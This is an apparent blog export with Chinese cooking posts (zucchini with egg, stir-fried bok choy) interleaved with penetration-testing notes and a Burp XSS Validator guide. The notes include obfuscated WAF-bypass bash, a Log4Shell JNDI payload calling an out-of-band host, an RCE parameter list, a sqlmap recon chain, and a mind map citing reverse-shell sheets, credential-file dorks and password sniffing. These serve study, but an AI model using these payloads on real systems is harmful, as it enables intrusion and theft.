      <title>复现ECR-2023-0309西葫炒蛋</title>
      <link href="posts/5c5b.html"/>
      <url>posts/5c5b.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-Introduction"><a href="#Ax-Introduction" class="headerlink" title="Ax Introduction"></a>Ax Introduction</h2><blockquote><p>独立的思维需要自我的沉淀与归纳之后的创新而产生，做菜也是如此。</p></blockquote><p>编号：ECR-2023-0309西葫炒蛋</p><p>等级：高赞</p><p>版本：v 1.0</p><blockquote><p>ECR（Enomothem Cooking Recurrence）伊诺烹饪法复现编号，由Enomothem于2023年2月24日由发现第一次做江西炒粉意外好吃而创建第一个编号ECR-2023-0224，用于记录根据平常烹饪而创新得到的好吃的食物，或者是觉得还不错的食物。等级有严赞，高赞，中赞和低赞。</p></blockquote><p>最近感觉下班回家带电脑有点多余了，回家买菜做饭吃饭玩会手机，然后差不多就很晚了，所以有不想打开电脑的欲望，索性今天就不带回家。</p><p>回家为什么要搞那么累呢，下班不就是休息的吗，这么一想，玩也可以玩的没用顾虑，之前带电脑回去没用打开，然后反而有罪恶感，暗中念叨，又是消磨时光的一天，电脑都没打开，玩也玩得不舒心，现在没有电脑了，反而玩得舒服，然后还有点小闲，看看技术文章。</p><p>记录一下大佬们的笔记吧。我把这些日常小学习笔记，心得体会称之为『学习随笔』。</p><p>为什么要把日常感谢，甚至学习记录在做菜的文章里呢？</p><blockquote><p>首先，我这是个人博客，并不是菜谱博客，所以单纯记录菜谱的做法，肯定是没有实用性。不如记录一下生活感悟。</p><p>其次，我认为生活中，学习和生活（吃饭、娱乐、琐事）是息息相关的，学习累了，就应该休息，学习饿了，就应该吃饭，学习乏了，就应该玩游戏，学习本就是生活的一部分，我们学习做饭，学习游戏怎么通关，再者，学习和生活的联系是很深的，对于某一天的记忆来说，你可能印象最深的不是学到了什么技术，而是在那天吃了什么好吃的，玩了什么好玩的。</p></blockquote><p>Bypass Linux waf</p><pre class=" language-bash"><code class="language-bash"><span class="token variable">$0</span><span class="token operator">&lt;&lt;&lt;</span>$\'\\<span class="token variable"><span class="token variable">$((</span><span class="token variable">$((</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token variable">))</span></span><span class="token comment" spellcheck="true">#10011010))\\$(($((1&lt;&lt;1))#10100011))\'</span></code></pre><p>Found a bypass working for a few WAF</p><pre class=" language-bash"><code class="language-bash"><span class="token variable">${${env:NaN:-j}</span>ndi<span class="token variable">${env:NaN:-:}</span><span class="token variable">${env:NaN:-l}</span>dap<span class="token variable">${env:NaN:-:}</span>//your.burpcollaborator.net/a<span class="token punctuation">}</span></code></pre><p><img src="https://lit.enomothem.com/zhixinghe/image-20230310110147075.png"></p><p>远程命令执行参数</p><pre class=" language-bash"><code class="language-bash">Top 25 Remote Code Execution<span class="token punctuation">(</span>RCE<span class="token punctuation">)</span> Parameterscmd<span class="token operator">=</span><span class="token punctuation">[</span>payload<span class="token punctuation">}</span>exec<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span>command<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span>execute<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span>ping<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span>query<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">]</span>jump<span class="token operator">=</span><span class="token punctuation">(</span>payload<span class="token punctuation">}</span>code<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">]</span>reg<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span>do<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span>func<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">]</span>arg<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span>option<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span>load<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">]</span>process<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span>step<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">]</span>read<span class="token operator">=</span><span class="token punctuation">[</span>payload<span class="token punctuation">}</span>function<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span>req<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span>feature<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span>exe<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span>module<span class="token operator">=</span><span class="token punctuation">[</span>payload<span class="token punctuation">}</span>payload<span class="token operator">=</span>fpayloadrun<span class="token operator">=</span>payload<span class="token punctuation">}</span>print<span class="token operator">=</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span></code></pre><p>寻找SQL注入Linux命令结合</p><pre class=" language-bash"><code class="language-bash">subfinder -d target <span class="token operator">|</span> <span class="token function">tee</span> -a domains<span class="token function">cat</span> domain <span class="token operator">|</span> httpx <span class="token operator">|</span> <span class="token function">tee</span> -a alive.txt<span class="token function">cat</span> alive.txt <span class="token operator">|</span> waybackurls <span class="token operator">|</span> <span class="token function">tee</span> -a urls gf sqli urls <span class="token operator">>></span> sqlisqlmap -m sqli --dbs --batch</code></pre><p>国外漏洞赏金平台</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230310110805455.png"></p><p>SSRF</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230310110826787.png"></p><h2 id="Bx-Preparation"><a href="#Bx-Preparation" class="headerlink" title="Bx Preparation"></a>Bx Preparation</h2><p>准备的食材</p><ul><li>西葫芦（<em>Cucurbita pepo</em> L.）</li><li>其它：<ul><li>辣椒</li><li>蒜</li></ul></li></ul><p>佐料</p><ul><li>食用油</li><li>味极鲜</li><li>鸡精</li><li>盐</li><li>耗油</li></ul><h2 id="Cx-Recurrence"><a href="#Cx-Recurrence" class="headerlink" title="Cx Recurrence"></a>Cx Recurrence</h2><blockquote><p>复现步骤，味道取决于当时的环境，厨房设施，对细节的把控。所以记录下来尽可能的还原味道。</p></blockquote><p>第一步 洗好切好</p><p>西葫芦摆好一分为二，二分为四，然后切掉中间部分的芯，然后切片【细节一：厚一点】，蒜切好，辣椒切好</p><p>第二步 开始操作</p><p>西葫芦炒起来会炒出西葫芦的汁水，所以先要用水煮一下，水开两分钟即可，七八熟，捞出滤水【细节二：滤水干一点】</p><p>准备搞几个鸡蛋，油热，直接打入鸡蛋，让鸡蛋清和蛋黄分离就行，不用提前搅拌，差不多定型翻炒几下，蛋黄也熟了就可以了。</p><p>好，一切准备就绪</p><p>正常炒菜步骤，油热，蒜入油激发香味</p><p>西葫芦入锅，【细节三，由于西葫芦，蛋都是预置处理过，所以这一阶段讲究大火快速翻炒】，炒几下就可以把蛋倒入了。</p><p>然后放入辣椒，盐，鸡精，味极鲜，耗油。继续将辣椒翻炒熟了就可以出锅。</p><p>第三步 出锅</p><p>经过前几次发现，菜直接在锅里吃起来不如倒入碗里好。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230310103308850.png"></p><p>总结</p><p>最近上火了，吃点清淡的，感觉还不错。</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 做饭 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 西葫炒蛋 </tag>
            
            <tag> 学习随笔 </tag>
            
            <tag> ECR-2023-0309 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp-Xssvalidator</title>
      <link href="posts/4740.html"/>
      <url>posts/4740.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-Introduction"><a href="#Ax-Introduction" class="headerlink" title="Ax Introduction"></a>Ax Introduction</h2><p>XSS Validator，XSS检测插件</p><h2 id="Bx-Install"><a href="#Bx-Install" class="headerlink" title="Bx Install"></a>Bx Install</h2><pre class=" language-bash"><code class="language-bash">下载PhantomJS：https://phantomjs.org/download.html下载xss.js:https://raw.githubusercontent.com/NetSPI/xssValidator/master/xss-detector/xss.js下载XSS Validator（Burp插件商店就有）：https://github.com/portswigger/xss-validator</code></pre><h2 id="Cx-Usage"><a href="#Cx-Usage" class="headerlink" title="Cx Usage"></a>Cx Usage</h2><p>将PhantomJS的bin目录添加到环境变量。</p><p>1.使用该插件时，启动环境：</p><pre class=" language-bash"><code class="language-bash">$ phantomjs xss.js</code></pre><p>2.将可疑的传参点发送到Intruder模块，设置变量</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230307120908761.png"></p><p>3.设置payload</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230307121350429.png"></p><p>4.配置grep-match</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230307121256079.png"></p><p>5.攻击</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230307121619490.png"></p><p>思路：利用HaE插件设置一些xss可能的参数，使其高亮，便于发现漏洞。</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> SecTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
            <tag> XSS </tag>
            
            <tag> BurpExtensions </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现ECR-2023-0306炒小白菜</title>
      <link href="posts/fda6.html"/>
      <url>posts/fda6.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-Introduction"><a href="#Ax-Introduction" class="headerlink" title="Ax Introduction"></a>Ax Introduction</h2><blockquote><p>独立的思维需要自我的沉淀与归纳之后的创新而产生，做菜也是如此。</p></blockquote><p>编号：ECR-2023-0306炒小白菜</p><p>等级：高赞</p><p>版本：v 1.0</p><blockquote><p>ECR（Enomothem Cooking Recurrence）伊诺烹饪法复现编号，由Enomothem于2023年2月24日由发现第一次做江西炒粉意外好吃而创建第一个编号ECR-2023-0224，用于记录根据平常烹饪而创新得到的好吃的食物，或者是觉得还不错的食物。等级有严赞，高赞，中赞和低赞。</p></blockquote><p>我们都期望 知道自己的将来是怎么样的，但是谁都知道现实就是现实，那些只不过只能想一想罢了，有如梦幻泡影，如梦如幻，我们为什么要算命呢？（要是我们通过算命知道了我们的每一个结局，那我们或者还有意思吗，就比如你正在看的电视剧精彩万分，错综复杂、跌宕起伏的剧情，突然让你知道了几十集后的结局，恐怕你会骂娘吧，无论是谁剧透都会被一个沉迷于剧情中的人感到厌恶，所以我们到底是为什么呢，我们为什么不期望得到一个未知的结果呢，我们其实是期享受了一个过程，这样才会让我们在结局的时候感到意外的惊喜。另外，大概就是我们的恐惧和焦虑吧，因为我们知道面对的很可能是不好的结果，所以我们急需一个答案，所以才会选择相信玄学。）是想知道一个答案，还是什么原因呢，人一旦在一个不确定的时候，会产生焦虑，不安，这些情绪需要一个答案，让你有一个确定性的归宿，真的也好，假的也罢，至少会按照确定的答案去发展，要是凶，那么就找一些方法避免，其实你所做的决定，事情就会往你所期望的方向发展，所以人一旦在一个地方待久了，就会失去这种趋势的想法，会趋于稳定态，你也就不想经历大的变，要知道人的处于变量的时间中的，这是一个熵增的世界，不做功你就无法抵抗熵，这种固有思维会让人不想尝试，无法进步，比如在某一个小领域，小事情上来说，每天走同一条路回家，吃着同一种菜，重复变成了习惯，要是有一天，走了另一条路，发现回家更快，路上还有美丽的风景，这天尝试了一种新的菜，发现原来这种菜这么好吃。</p><p>上文谈到的是一个完全没有逻辑的描述，但蕴含着我总结的一个看法，要创新，要变，将得到意外之喜。不要被随机的决定代替了你自己的决定（算命或抛硬币），遇到什么困难不能克服，你必须面对它。</p><blockquote><p>我的所有观点，都有一个单独的环境空间，特定的条件下所总结的，所以不适用于任何条件。</p></blockquote><p>什么意思呢，如果别人向你提建议，你最好不要建议，而是不知道，因为你和他的角度，所处的环境都不一样，你无法理解它。</p><p>===</p><p>话题二：根据地思维</p><p>这个是我在初中和同学玩五子棋得出的想法，我取名根据地思维，其实发现生活中很多事情都符合这种思维，其实就是树状思维吧，有一个根，然后分支节点，五子棋使用五行八卦阵，你可以拥有大片的领地，并且可以只使用少量的棋子，这样你就可以做很多事情，五子棋必须五子一线，所以你需要尽可能在某个地方拥有足够多的棋子才能威胁到敌人，棋子较多那么敌人的围堵也就多，这就是根据地，这里没有什么可利用点了，那么就需要另寻他地，然后因为有根据地的稳固，使得新据点有足够的发挥空间，也就是根据地吸引火力，同时创建更多的据点，让敌人无法防御，导致崩盘，我们才有机会将五子连成一线。</p><p>在写书籍，博客的时候，我们的目录结构也是如此，一本书的主题就是围绕的一个东西的讨论，每个章节都逃离不了和书名的联系，没有关系的内容就不会较大篇幅的描述，我们学习一个新领域的知识的时候，我们就需要一个这样的思维，从根支入手，当我们涉及到不是承上启下的内容时，我们就需要扁平化的去同步学习，利用思维导图。</p><p>就如同信息收集，每一个收集到的信息都可以作为漏洞利用的点。漏洞扫描的原理也是如此，只要有一个被突破了，那么将威胁至整个系统。</p><blockquote class="pullquote mindmap mindmap-md"><ul><li>Reconnaissance（侦察）<ul><li>Passive/Semi-Passive（被动/半被动信息收集）<ul><li>Third Party Resources（第三方资源们）<ul><li>Locate Target Range<ul><li>ARIN - <a href="https://www.arin.net/">https://www.arin.net/</a></li></ul></li><li>Fingerprint Domain/Website（收集域名/网站指纹）<ul><li>Shodan - <a href="https://www.shodan.io/">https://www.shodan.io/</a></li><li>Censys - <a href="https://www.censys.io/">https://www.censys.io/</a></li><li>Zoomeye - <a href="https://www.zoomeye.org/">https://www.zoomeye.org</a></li><li>Netcraft - <a href="https://www.netcraft.com/">https://www.netcraft.com/</a></li><li>Extended Network Information（加强版网络信息）<ul><li>Central Ops - <a href="https://centralops.net/co/DomainDossier.aspx">https://centralops.net/co/DomainDossier.aspx</a></li><li>Robtex - <a href="https://www.robtex.net/">https://www.robtex.net/</a></li></ul></li><li>Metasploit Scanning（Metasploit扫描）<ul><li>auxiliary/scanner/*<ul><li>portscan/tcp</li><li>http/http_version<ul><li>http/tomcat_enum</li></ul></li><li>http/trace_axd<ul><li>Google - site:<result from="" above=""> filetype:axd OR inurl:trace.axd</result></li></ul></li></ul></li></ul></li></ul></li></ul></li><li>Command Line Recon（命令行侦察）<ul><li>Network Information （网络信息）<ul><li>nslookup <target><ul><li>DNS cache snooping</li></ul></target></li><li>dig <target></target></li></ul></li><li>Security Mechanisms （安全机制）<ul><li>halberd</li></ul></li><li>Metadata（元数据）<ul><li>exiftool</li><li>strings<ul><li>strings -e b (big endian) OR -e l (little endian)</li></ul></li></ul></li></ul></li><li>People Search（搜人）<ul><li>Yahoo People Search - <a href="http://itools.com/tool/yahoo-people-search">http://itools.com/tool/yahoo-people-search</a></li><li>Switchboard - <a href="http://www.switchboard.com/person">http://www.switchboard.com/person</a></li><li>Google Finance - <a href="https://www.google.com/finance">https://www.google.com/finance</a></li><li>Zaba - <a href="http://www.zabasearch.com/">http://www.zabasearch.com/</a></li></ul></li></ul></li><li>Active（主动信息收集）<ul><li>Command Line Recon Tools（命令行侦察工具们）<ul><li>General Recon（通用侦察手段）<ul><li>Recon-NG<ul><li>Automated with <a href="https://github.com/jhaddix/domain">https://github.com/jhaddix/domain</a></li></ul></li><li>Domain/Subdomain Information（域名/子域名信息）<ul><li>Fierce</li><li>The Harvester</li><li>Dirb</li><li>Dirbuster</li></ul></li></ul></li><li>Nmap<ul><li>nmap -Pn -sSU -sV –top-ports 20 <target></target></li></ul></li><li>Create Custom Worldlist（建立自定义字典）<ul><li>cewl - <a href="https://digi.ninja/projects/cewl.php">https://digi.ninja/projects/cewl.php</a></li><li>wget - <a href="http://wiki.securityweekly.com/wiki/index.php/Episode129">http://wiki.securityweekly.com/wiki/index.php/Episode129</a></li></ul></li></ul></li><li>Software（软件们）<ul><li>FOCA</li><li>SPARTA</li><li>Maltego</li><li>Dirbuster</li></ul></li></ul></li><li>Browser Extensions（浏览器插件们）<ul><li>Chrome</li><li>Firefox</li><li>Safari</li></ul></li><li>Google Searching（Google高级搜索）<ul><li>site:”target name” jobs,careers,openings,etc</li><li>intitle:”index of <keyword>“<ul><li>Keyword<ul><li>.bash_history</li><li>etc/shadow</li><li>finances.xls(x)</li><li>htpasswd</li><li>inurl:maillog</li></ul></li></ul></keyword></li><li>site:<em>.edu filetype:</em>.bak OR <keyword><ul><li>Keyword<ul><li>*.conf</li><li>*.backup</li></ul></li></ul></keyword></li></ul></li></ul></li><li>Enumeration（信息枚举）<ul><li>Internal（内部网络）<ul><li>Scanning（扫描）<ul><li>Map Internal Network（建立内网拓扑）<ul><li>Command Line Tools（命令行工具们）<ul><li>arp -a</li><li>ip neigh show</li><li>smbtree -NS 2&gt;/dev/null</li><li>nbtscan -r <current_iprange></current_iprange></li><li>netdiscover -r <current_iprange></current_iprange></li><li>nmap -n -Pn -T5 -sS <current_iprange><ul><li>nmap NSE scripts<ul><li>NFS</li><li>SMB</li></ul></li></ul></current_iprange></li></ul></li></ul></li></ul></li><li>Pivoting（跳板/转发）<ul><li>SSH Proxy Tunneling with Proxychain<ul><li><a href="http://magikh0e.ihtb.org/pubPapers/ssh_gymnastics_tunneling.html">http://magikh0e.ihtb.org/pubPapers/ssh_gymnastics_tunneling.html</a></li></ul></li></ul></li></ul></li><li>External（外部网络）<ul><li>Scanning（扫描）<ul><li>Nmap</li><li>Unicornscan</li><li>OneTwoPunch<ul><li>Combines nmap and unicorn scan <a href="https://github.com/superkojiman/onetwopunch/blob/master/onetwopunch.sh">https://github.com/superkojiman/onetwopunch/blob/master/onetwopunch.sh</a></li></ul></li></ul></li></ul></li></ul></li><li>Exploitation（漏洞利用）<ul><li>External（外部网络）<ul><li>Web Vulnerability Scanners（Web漏洞扫描器们）<ul><li>Burp<ul><li><a href="https://portswigger.net/burp/">https://portswigger.net/burp/</a></li><li>My Guide: <a href="http://pastebin.com/nNHYP9Jd">http://pastebin.com/nNHYP9Jd</a></li></ul></li><li>Wapiti<ul><li><a href="http://wapiti.sourceforge.net/">http://wapiti.sourceforge.net/</a></li></ul></li><li>w3af<ul><li><a href="http://w3af.org/">http://w3af.org/</a></li></ul></li><li>Nikto<ul><li><a href="https://cirt.net/Nikto2">https://cirt.net/Nikto2</a></li></ul></li></ul></li><li>Framework（框架）<ul><li>web2attack<ul><li><a href="https://github.com/santatic/web2attack">https://github.com/santatic/web2attack</a></li></ul></li></ul></li><li>Command Line Tools（命令行工具们）<ul><li>CMSmap<ul><li><a href="https://github.com/Dionach/CMSmap">https://github.com/Dionach/CMSmap</a></li></ul></li><li>WPscan<ul><li><a href="https://wpscan.org/">https://wpscan.org/</a></li></ul></li><li>Joomscan<ul><li><a href="https://www.owasp.org/index.php/Category:OWASP_Joomla_Vulnerability_Scanner_Project">https://www.owasp.org/index.php/Category:OWASP_Joomla_Vulnerability_Scanner_Project</a></li></ul></li></ul></li></ul></li><li>Internal（内部网络）<ul><li>LAN Attacks（LAN攻击）<ul><li>Local Python Server -<ul><li>Serve Shells/Exploits（建立Shell和Exploits下载站）<ul><li>python -m SimpleHTTPServer <port></port></li><li>python3 -m http.server <port></port></li><li>php -S <host>:<port></port></host></li></ul></li><li>LLMNR/NBT-NS Poisoning（LLMNR/NBT-NS投毒）<ul><li>Responder - <a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a><ul><li>Listen/respond to LLMNR NBTNS requests</li></ul></li></ul></li></ul></li></ul></li><li>Local Vulnerability Scanning（本地漏洞扫描）<ul><li>LinEnum- <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li><li>Unix-privesc-check</li><li>Linux_Exploit_Suggester</li></ul></li><li>Comprehensive Linux Enumeration（详细，全面的Linux枚举）<ul><li><a href="http://www.rebootuser.com/?p=1623">http://www.rebootuser.com/?p=1623</a></li></ul></li><li>Bypass AV（反病毒软件绕过）<ul><li>PowerSploit - Python Powershell Shell<ul><li><a href="https://www.hackingloops.com/powersploit-quick-shell-for-penetration-testing/">https://www.hackingloops.com/powersploit-quick-shell-for-penetration-testing/</a></li></ul></li><li>Download Files via Command Line（通过命令行下载文件）<ul><li><a href="https://www.greyhathacker.net/?p=500">https://www.greyhathacker.net/?p=500</a></li></ul></li></ul></li><li>Reverse Shells（反向Shell）<ul><li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li><li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">https://highon.coffee/blog/reverse-shell-cheat-sheet/</a></li></ul></li><li>Attack Tools（攻击工具）<ul><li>Responder - <a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></li><li>SMBExec - <a href="https://github.com/pentestgeek/smbexec">https://github.com/pentestgeek/smbexec</a></li><li>WCE - <a href="http://www.darknet.org.uk/2015/02/windows-credentials-editor-wce-list-add-change-logon-sessions/">http://www.darknet.org.uk/2015/02/windows-credentials-editor-wce-list-add-change-logon-sessions/</a></li></ul></li></ul></li></ul></li><li>Post-Exploitation（后渗透阶段）<ul><li>Comprehensive Wiki<ul><li><a href="http://pwnwiki.io/#!index.md">http://pwnwiki.io/#!index.md</a></li></ul></li><li>Pivoting（跳板/平移）<ul><li>Stealing Hashes（窃取hashes）<ul><li>WCE - <a href="http://www.darknet.org.uk/2015/02/windows-credentials-editor-wce-list-add-change-logon-sessions/">http://www.darknet.org.uk/2015/02/windows-credentials-editor-wce-list-add-change-logon-sessions/</a></li></ul></li><li>Password Sniffing（密码嗅探）<ul><li>Tcpdump<ul><li>tcpdump -i eth0 port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep –i ‘pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=||name=|name:|pass:|user:|username:|password:|login:|pass |user ‘ –color=auto –line-</li></ul></li><li>Ngrep<ul><li>ngrep -q -W byline “GET|POST HTTP”</li></ul></li><li>Dsniff<ul><li>dsniff -m</li></ul></li></ul></li></ul></li><li>Attack Frameworks/Tools（攻击框架/工具）<ul><li>Empire<ul><li><a href="http://www.powershellempire.com/">http://www.powershellempire.com/</a></li></ul></li><li>Armitage<ul><li><a href="http://blog.cobaltstrike.com/2016/05/25/raffis-abridged-guide-to-cobalt-strike/">http://blog.cobaltstrike.com/2016/05/25/raffis-abridged-guide-to-cobalt-strike/</a></li></ul></li><li>Privilege Escalation（权限提升）<ul><li>PowerSploit - <a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></li></ul></li></ul></li><li>Download Files via Command Line（通过命令行下载文件）<ul><li><a href="https://www.greyhathacker.net/?p=500">https://www.greyhathacker.net/?p=500</a></li></ul></li><li>Information Gathering（信息收集）<ul><li>LinEnum - <a href="http://www.rebootuser.com/?p=1758">http://www.rebootuser.com/?p=1758</a></li><li>privilege-escalation-awesome-scripts-suite - <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a></li></ul></li></ul></li><li>Exfiltration（撤出）<ul><li>Detection Capabilities（探测能力）<ul><li>Egress-Assess<ul><li><a href="https://github.com/ChrisTruncer/Egress-Assess">https://github.com/ChrisTruncer/Egress-Assess</a></li></ul></li><li>Outbound Port Detection (find unfiltered outbound connections)（探测出端口，指找到未被过滤的出口连接）<ul><li><a href="http://www.floyd.ch/?p=352">http://www.floyd.ch/?p=352</a></li></ul></li></ul></li><li>Network Exfiltration（网络撤出）</li></ul></li><li>Phishing（钓鱼）<ul><li>Important: Immediately pivot from initial host（重要：应尽快从最初入侵的主机跳转/平移出去）</li><li>Tools（工具们）<ul><li>Empire<ul><li><a href="https://enigma0x3.net/2016/03/15/phishing-with-empire/">https://enigma0x3.net/2016/03/15/phishing-with-empire/</a></li></ul></li><li>Gophish<ul><li><a href="https://github.com/gophish/gophish">https://github.com/gophish/gophish</a></li></ul></li></ul></li><li>Initial Access Techniques（建立初始入侵的技术们）<ul><li>Office Macros</li></ul></li><li>Tools for Internal Use（内部使用的工具）<ul><li>PowerView - stealuserhunter</li></ul></li></ul></li><li>Misc.（杂项）<ul><li>Find Exploits（查找漏洞利用）<ul><li>Linux<ul><li>Command line<ul><li>searchsploit -e Windows 7<ul><li>searchsploit windows 2007 | grep -i local</li></ul></li></ul></li></ul></li><li>Web<ul><li>Exploit-db<ul><li><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li></ul></li><li>Packet Storm<ul><li><a href="https://packetstormsecurity.com/files/tags/exploit">https://packetstormsecurity.com/files/tags/exploit</a></li></ul></li></ul></li></ul></li><li>Various Automation（各种自动化工具）<ul><li><a href="https://github.com/leebaird/discover">https://github.com/leebaird/discover</a></li></ul></li></ul></li></ul></blockquote><h2 id="Bx-Preparation"><a href="#Bx-Preparation" class="headerlink" title="Bx Preparation"></a>Bx Preparation</h2><p>准备的食材</p><ul><li>小白菜（<em>Brassica campestris</em>L.ssp.<em>chinensis</em> Makino var.<em>communis</em> Tsen et Lee）</li><li>其它：<ul><li>葱、蒜</li></ul></li></ul><p>佐料</p><ul><li>食用油</li><li>味极鲜</li><li>鸡精</li><li>盐</li></ul><h2 id="Cx-Recurrence"><a href="#Cx-Recurrence" class="headerlink" title="Cx Recurrence"></a>Cx Recurrence</h2><blockquote><p>复现步骤，味道取决于当时的环境，厨房设施，对细节的把控。所以记录下来尽可能的还原味道。</p></blockquote><p>第一步 洗好切好</p><p>摆好一分为二，叶子部分，根部，根部掰掉叶支部，大根头就丢了吧。葱蒜切好，切成细碎</p><hr><p>忘记的步骤：</p><p>锅里倒油，油热，倒一点油到洗好的干虾碗里滋出香味，备用，出锅前倒入就行。</p><hr><p>第二步 开始操作</p><p>油热{大火}，葱蒜倒入与热油碰撞出葱蒜的浓郁香味，小白菜倒入，那滋滋响声就对了。</p><p>炒到差不多软了，放盐、鸡精，倒一点味极鲜。</p><p>葱段放入。</p><p>第三步 出锅</p><p>洗净盘子，将菜倒入其中，这一步最为重要，因为人生中，往往最后时刻才是最重要的，比如一件事情，最后掉了链子，那么所以的能力都将功亏一篑，如何将菜精准的倒入碗中，完成。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230307130344298.png"></p><p>总结</p><p>本来只买了辣椒炒肉，老板说来一个白菜，我又看了一眼，她接着说今天搞特价，简直拿捏了我的购买心理，又接着说，今天的，新鲜，短短几句话简直让我没有不买的理由，就好像不买就吃亏了，又考虑到最近蔬菜吃得少，所以买下了。</p><p>本以为今天的主角是辣椒炒肉，没想到我有自信的辣椒炒肉翻车了，反而这碗小炒青菜太好吃了，因此记录于此。</p><p>辣椒炒肉翻车的原因我大概也猜到了，我看油到多了，我就把油倒一些了，然后炒太久了，所以导致了最终的结局。上次回锅肉炒辣椒很成功，很遗憾没有及时记录，现在已经忘记当时的感觉了。</p><p>关于要不要焯水，小白菜可以直接生吃，所以就不焯水了，反正菠菜是一定要焯水的，要知道焯水也是考验技术的，焯水2分钟，小白菜将失去大量的维生素。</p><p>优化建议：</p><p>下次把这次忘记的步骤加入试试。</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 做饭 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 炒小白菜 </tag>
            
            <tag> 学习方法 </tag>
            
            <tag> ECR-2023-0306 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IRF-Ds_Store文件泄露漏洞</title>
      <link href="posts/7745.html"/>
      <url>posts/7745.html</url>
      
